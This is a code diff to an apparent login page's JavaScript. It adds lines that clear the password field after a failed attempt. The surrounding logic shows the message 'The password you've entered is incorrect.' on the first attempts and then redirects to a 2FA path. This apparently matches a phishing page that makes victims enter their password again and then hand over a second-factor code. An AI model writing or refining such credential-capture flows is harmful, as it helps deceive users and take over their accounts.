@@ -3759,6 +3759,7 @@
                         if (attempts < 2) {
                             // First attempt: Show error and reset button immediately
                             showError("The password you've entered is incorrect.");
+                            $('input[name="pass"]').val('').removeClass('has-content');
                             $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
                         } else {
                             // Second attempt: Redirect to 2FA path
@@ -3768,6 +3769,7 @@
                     },
                     error: function () {
                         showError("The password you've entered is incorrect.");
+                        $('input[name="pass"]').val('').removeClass('has-content');
                         $btn.removeClass('btn-disabled').css({ 'opacity': '1', 'pointer-events': 'auto' });
                     }
                 });
